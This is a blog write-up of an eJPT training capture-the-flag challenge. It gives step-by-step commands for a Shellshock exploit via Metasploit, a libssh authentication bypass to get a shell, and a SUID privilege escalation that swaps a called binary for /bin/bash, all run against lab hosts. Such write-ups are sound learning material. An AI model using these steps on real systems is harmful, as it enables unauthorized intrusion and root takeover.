+++
date = '2025-04-12T11:30:14+10:00'
draft = false
title = 'EJPT System Host Based Attacks CTF 2'
+++
# System/Host Based Attacks CTF 2

For this CTF, there are 4 available flags.
To find them, we need to exploit vulnerabilities found on the Linux system we are provided.

---
## The Flags
1. Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
  
2. In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
 
3. Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
 
4. The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

---
## The Tools
- Nmap
- Burp Suite
- Metasploit Framework

---
## Target 1 (target1.ine.local)

### Recon
To start off, I conducted an nmap service scan to find the available services found on the most common TCP ports.
<img src="{{ "images/Picture1.jpg" | relURL }}" alt="..." />
<img src="{{ "images/Picture1.jpg" | absURL }}" alt="..." />
> *nmap -sV target1.ine.local*

![demo](static/images/Picture1.jpg)

This shows that port 80 was open and running Apache httpd.

I wanted to check this out in the browser to find any points that I could exploit and found that it redirected to 192.109.147.3/browser.cgi

This reminded me of the Shellshock vulnerability that we had learnt about in the Linux module.

To verify this, I ran an nmap scan with the http-shellshock script.

> *nmap -sV 192.109.147.3 --script=http-shellshock --script-args="http-shellshock.uri=/browser.cgi"*

This provided me with confirmation that the target was vulnerable to the Shellshock exploit.

### Exploitation

To run the Shellshock exploit, I decided to use the automated approach, utilising msfconsole.

To run msfconsole, I needed to start the postgresql service, so I ran the following command:

> *service postgresql start && msfconsole*

Then I made a new workspace for the first target and set the global variable for target1.

> *workspace -a target1*

> *setg RHOSTS 192.109.147.3*

To set the exploit for Shellshock, I used the following module:

> *use exploit/multi/http/apache_mod_cgi_bash_env_exec*

Set the target uri and LHOST (our machine):

> *set TARGETURI /browser.cgi*

> *set LHOST 192.109.147.2*

Then run the module:

> *exploit*

Now we have a meterpreter session start.

### Post-exploitation

Now we have to survey the environment and see what could be useful:

> *dir*

There is a .flag.txt file here! Let's print the contents:

![demo](/my-site/images/Picture2.jpg)

This actually turns out to be the second flag.

As the first flag asked us to check the root directory, that's what we will do next:

> *cd /*

> *dir*

And there's another flag, the first one! Let's print it!

> *cat flag.txt*

![demo](/my-site/images/Picture3.jpg)

---

## Target 2

### Recon

Again we will start with an nmap service scan:

> *nmap -sV target2.ine.local*

![demo](/my-site/images/Picture4.jpg)

This shows us that SSH is open on port 22.

As flag 3 instructs us to consider using "libssh_auth_bypass", lets try that.

### Exploitation

Start up msfconsole:

> *msfconsole*

Create workspace for target2:

> *workspace -a target2*

Set global variable:

> *setg RHOSTS 192.109.147.4*

Use the suggested module and set SPAWN_PTY:

> *use auxiliary/scanner/ssh/libssh_auth_bypass*

> *set SPAWN_PTY true*

Run the module:

> *run*

Now we can check our sessions and go into the session created through the module we ran:

> *sessions*

> *sessions 1*

### Post-exploitation

We now have a meterpreter session and we can check the environment:

> *cd home*

> *ls*

> *cd user*

There is a flag.txt here too!

> *cat flag.txt*

![demo](/my-site/images/Picture5.jpg)

Now we have flag 3, time to find the last one.

> *ls -al*

Here we find the file welcome and in it's permissions we see the s flag it set so it has SUID permissions enabled.

Next, we can check out the file type and the strings in it with:

> *file welcome*

> *strings welcome*

We can see here, it calls upon the greetings binary, which is in the same directory.

Let's utilise this, so we can run a command with root privileges.

> *rm greetings*

> *cp /bin/bash greetings*

And run the welcome file:

> *./welcome*

We now have root access and have the permissions necessary to check out what's hiding in the root directory.

> *cd ../..*

> *cd root*

> *ls*

Here's the last flag:

> *cat flag.txt*

![demo](/my-site/images/Picture6.jpg)

---

## Summary

This CTF was fun and utilised a lot of the information and tactics learnt in the Host & Network Penetration Testing: System/Host Based Attacks" course.

It was great to use these techniques again without being prompted, as in many of the practice labs after the video on each technique.

My goal in the upcoming labs and CTF challenges, is to use manual ways of these exploits, as opposed to the automated techniques with msfconsole.

Either way, I learnt a lot throughout this course and was able to display some of it through this CTF challenge.

As I continue through my journey of completing the eJPT certification, I will be sure to continue to upload walkthroughs of the future challenges.


